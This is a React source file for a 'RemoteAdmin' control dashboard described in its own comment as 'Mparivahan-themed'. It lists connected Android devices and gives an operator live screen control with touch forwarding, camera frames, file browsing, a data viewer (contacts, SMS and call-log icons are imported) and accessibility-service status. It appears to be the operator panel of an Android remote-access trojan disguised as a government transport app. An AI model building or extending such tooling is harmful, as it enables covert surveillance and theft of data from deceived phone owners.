import React, { useState } from 'react';
import {
  Box, AppBar, Toolbar, Typography, IconButton, Chip, Drawer,
  List, ListItemButton, ListItemIcon, ListItemText, Divider,
  Avatar, Badge, Tooltip, Paper,
} from '@mui/material';
import {
  Menu as MenuIcon, PhoneAndroid, ScreenShare, CameraAlt, Mic,
  Folder, Contacts, Sms, CallLog, Apps, Settings, PowerSettingsNew,
  Refresh, SignalCellular4Bar, SignalCellularOff, Home, ArrowBack,
  Apps as Recents, KeyboardArrowUp, KeyboardArrowDown,
  TouchApp, Security,
} from '@mui/icons-material';

import useWebSocket from '../hooks/useWebSocket';
import PhoneScreen from './PhoneScreen';
import ControlPanel from './ControlPanel';
import FileExplorer from './FileExplorer';
import DataViewer from './DataViewer';

const DRAWER_WIDTH = 260;

/**
 * Dashboard
 *
 * Main Mparivahan-themed control center with:
 * - Left drawer: device list, navigation
 * - Center: live phone screen with touch forwarding
 * - Right panel: controls, file browser, data viewers
 */
export default function Dashboard({ token, serverUrl, onLogout }) {
  const [drawerOpen, setDrawerOpen] = useState(true);
  const [activeTab, setActiveTab] = useState('control');

  const {
    connected, devices, activeDevice, status,
    screenFrame, cameraFrame, lastMessage,
    sendCommand, switchDevice, refreshDevices,
  } = useWebSocket(serverUrl, token);

  const currentDevice = devices.find((d) => d.deviceId === activeDevice);

  return (
    <Box sx={styles.root}>
      {/* ─── Top App Bar ──────────────────────────────────────────────── */}
      <AppBar position="fixed" sx={styles.appBar}>
        <Toolbar>
          <IconButton
            color="inherit"
            edge="start"
            onClick={() => setDrawerOpen(!drawerOpen)}
            sx={{ mr: 2 }}
          >
            <MenuIcon />
          </IconButton>

          {/* Logo & Title */}
          <Box sx={styles.brand}>
            <PhoneAndroid sx={{ color: '#FFD54F', fontSize: 28 }} />
            <Typography variant="h6" sx={{ ml: 1, fontWeight: 700, color: '#fff' }}>
              RemoteAdmin
            </Typography>
            <Typography variant="caption" sx={{
              ml: 1, color: 'rgba(255,255,255,0.7)',
              display: { xs: 'none', sm: 'block' },
            }}>
              Control Center
            </Typography>
          </Box>

          <Box sx={{ flex: 1 }} />

          {/* Connection Status */}
          <Chip
            icon={connected ? <SignalCellular4Bar /> : <SignalCellularOff />}
            label={connected ? 'Connected' : 'Disconnected'}
            color={connected ? 'success' : 'error'}
            size="small"
            sx={{ mr: 1 }}
          />

          {/* Active Device Info */}
          {currentDevice && (
            <Chip
              label={currentDevice.deviceInfo?.model || activeDevice?.slice(0, 12)}
              size="small"
              color="info"
              sx={{ mr: 1, display: { xs: 'none', md: 'flex' } }}
            />
          )}

          {/* Logout */}
          <Tooltip title="Disconnect">
            <IconButton color="inherit" onClick={onLogout}>
              <PowerSettingsNew />
            </IconButton>
          </Tooltip>
        </Toolbar>

        {/* Saffron accent stripe */}
        <Box sx={styles.saffronStripe} />
      </AppBar>

      {/* ─── Left Drawer ──────────────────────────────────────────────── */}
      <Drawer
        variant="persistent"
        open={drawerOpen}
        sx={{
          width: drawerOpen ? DRAWER_WIDTH : 0,
          flexShrink: 0,
          '& .MuiDrawer-paper': {
            width: DRAWER_WIDTH,
            mt: '68px',
            height: 'calc(100% - 68px)',
          },
        }}
      >
        {/* Devices Section */}
        <Box sx={{ p: 2 }}>
          <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <Typography variant="subtitle2" sx={{ color: '#0D47A1', fontWeight: 700 }}>
              DEVICES
            </Typography>
            <Tooltip title="Refresh">
              <IconButton size="small" onClick={refreshDevices}>
                <Refresh fontSize="small" />
              </IconButton>
            </Tooltip>
          </Box>
        </Box>

        {devices.length === 0 ? (
          <Box sx={{ p: 2, textAlign: 'center' }}>
            <Typography variant="body2" sx={{ color: '#9E9E9E' }}>
              No devices connected
            </Typography>
          </Box>
        ) : (
          <List dense>
            {devices.map((device) => (
              <ListItemButton
                key={device.deviceId}
                selected={activeDevice === device.deviceId}
                onClick={() => switchDevice(device.deviceId)}
              >
                <ListItemIcon>
                  <Badge
                    variant="dot"
                    color="success"
                    invisible={device.status?.screenCapture !== true}
                  >
                    <PhoneAndroid sx={{
                      color: activeDevice === device.deviceId ? '#1565C0' : '#9E9E9E',
                    }} />
                  </Badge>
                </ListItemIcon>
                <ListItemText
                  primary={device.deviceInfo?.model || device.deviceId}
                  secondary={device.deviceInfo?.androidVersion
                    ? `Android ${device.deviceInfo.androidVersion}`
                    : device.deviceId}
                  primaryTypographyProps={{ fontWeight: 600, fontSize: '0.85rem' }}
                  secondaryTypographyProps={{ fontSize: '0.7rem' }}
                />
              </ListItemButton>
            ))}
          </List>
        )}

        <Divider sx={{ my: 1 }} />

        {/* Navigation */}
        <Box sx={{ p: 2 }}>
          <Typography variant="subtitle2" sx={{ color: '#0D47A1', fontWeight: 700 }}>
            NAVIGATION
          </Typography>
        </Box>

        <List dense>
          {navItems.map((item) => (
            <ListItemButton
              key={item.key}
              selected={activeTab === item.key}
              onClick={() => setActiveTab(item.key)}
            >
              <ListItemIcon>
                <item.icon sx={{
                  color: activeTab === item.key ? '#1565C0' : '#9E9E9E',
                }} />
              </ListItemIcon>
              <ListItemText
                primary={item.label}
                primaryTypographyProps={{
                  fontWeight: activeTab === item.key ? 600 : 400,
                  fontSize: '0.85rem',
                  color: activeTab === item.key ? '#1565C0' : '#424242',
                }}
              />
            </ListItemButton>
          ))}
        </List>

        <Box sx={{ flex: 1 }} />

        {/* Security Badge */}
        <Box sx={{ p: 2, borderTop: '1px solid #E0E0E0' }}>
          <Box sx={styles.securityBadge}>
            <Security sx={{ fontSize: 14, color: '#FF6F00' }} />
            <Typography variant="caption" sx={{ color: '#757575', ml: 0.5 }}>
              Encrypted Session
            </Typography>
          </Box>
        </Box>
      </Drawer>

      {/* ─── Main Content ─────────────────────────────────────────────── */}
      <Box
        component="main"
        sx={{
          flexGrow: 1,
          mt: '68px',
          ml: drawerOpen ? `${DRAWER_WIDTH}px` : 0,
          transition: 'margin 0.2s ease',
          p: { xs: 1, sm: 2, md: 3 },
          display: 'flex',
          flexDirection: 'column',
          minHeight: 'calc(100vh - 68px)',
        }}
      >
        {activeTab === 'control' && (
          <Box sx={{ display: 'flex', gap: 2, flex: 1, flexWrap: 'wrap' }}>
            {/* Phone Screen Viewer */}
            <Box sx={{ flex: '1 1 400px', minWidth: 320 }}>
              <Paper sx={styles.screenPaper}>
                <PhoneScreen
                  screenFrame={screenFrame}
                  cameraFrame={cameraFrame}
                  sendCommand={sendCommand}
                  status={status}
                />
              </Paper>
            </Box>

            {/* Control Panel */}
            <Box sx={{ flex: '1 1 300px', minWidth: 280 }}>
              <ControlPanel
                sendCommand={sendCommand}
                status={status}
                currentDevice={currentDevice}
              />
            </Box>
          </Box>
        )}

        {activeTab === 'files' && (
          <FileExplorer sendCommand={sendCommand} lastMessage={lastMessage} />
        )}

        {activeTab === 'data' && (
          <DataViewer sendCommand={sendCommand} lastMessage={lastMessage} />
        )}

        {activeTab === 'settings' && (
          <SettingsPanel currentDevice={currentDevice} status={status} />
        )}
      </Box>
    </Box>
  );
}

const navItems = [
  { key: 'control', label: 'Control Center', icon: TouchApp },
  { key: 'files', label: 'File Explorer', icon: Folder },
  { key: 'data', label: 'Data Viewer', icon: Contacts },
  { key: 'settings', label: 'Settings', icon: Settings },
];

function SettingsPanel({ currentDevice, status }) {
  return (
    <Paper sx={{ p: 3, maxWidth: 600 }}>
      <Typography variant="h6" sx={{ color: '#0D47A1', mb: 2 }}>
        Device Settings
      </Typography>
      {currentDevice && (
        <Box>
          <InfoRow label="Device Model" value={currentDevice.deviceInfo?.model || 'Unknown'} />
          <InfoRow label="Manufacturer" value={currentDevice.deviceInfo?.manufacturer || 'Unknown'} />
          <InfoRow label="Android Version" value={currentDevice.deviceInfo?.androidVersion || 'Unknown'} />
          <InfoRow label="SDK Version" value={currentDevice.deviceInfo?.sdkVersion || 'Unknown'} />
          <InfoRow label="Battery" value={currentDevice.deviceInfo?.batteryLevel
            ? `${currentDevice.deviceInfo.batteryLevel}%`
            : 'Unknown'} />
          <InfoRow label="Accessibility Service" value={status.accessibility ? 'Active' : 'Inactive'}
            color={status.accessibility ? '#2E7D32' : '#C62828'} />
        </Box>
      )}
    </Paper>
  );
}

function InfoRow({ label, value, color }) {
  return (
    <Box sx={{ display: 'flex', justifyContent: 'space-between', py: 1, borderBottom: '1px solid #F5F5F5' }}>
      <Typography variant="body2" sx={{ color: '#757575' }}>{label}</Typography>
      <Typography variant="body2" sx={{ fontWeight: 600, color: color || '#212121' }}>{value}</Typography>
    </Box>
  );
}

const styles = {
  root: { display: 'flex', minHeight: '100vh' },
  appBar: {
    zIndex: (t) => t.zIndex.drawer + 1,
  },
  brand: {
    display: 'flex',
    alignItems: 'center',
  },
  saffronStripe: {
    position: 'absolute',
    bottom: 0,
    left: 0,
    right: 0,
    height: 3,
    background: 'linear-gradient(90deg, #FF6F00, #FFA040, #FF6F00)',
  },
  screenPaper: {
    borderRadius: 3,
    overflow: 'hidden',
    border: '2px solid #E0E0E0',
    background: '#000',
  },
  securityBadge: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    p: 1,
    borderRadius: 2,
    backgroundColor: '#FFF8E1',
  },
};
